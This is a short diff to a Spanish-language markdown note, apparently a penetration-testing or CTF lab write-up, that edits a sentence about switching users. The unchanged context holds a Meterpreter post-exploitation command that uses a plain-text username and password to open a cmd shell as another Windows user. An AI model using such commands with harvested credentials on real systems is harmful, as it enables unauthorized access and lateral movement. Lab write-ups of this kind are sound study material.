@@ -276,6 +276,6 @@ vamos a utilizar runas para poder invocar una nueva shell con las credenciales d
 ```python
 meterpreter > run post/windows/manage/run_as_psh USER=tstark PASS=playboy69 EXE=cmd.exe
 ```
-con las credenciales podemos hacer el cambio para una 
+con las credenciales podemos hacer el cambio para una cmd del usuario en cuestion
 ![[Pasted image 20240404163052.png]]
 
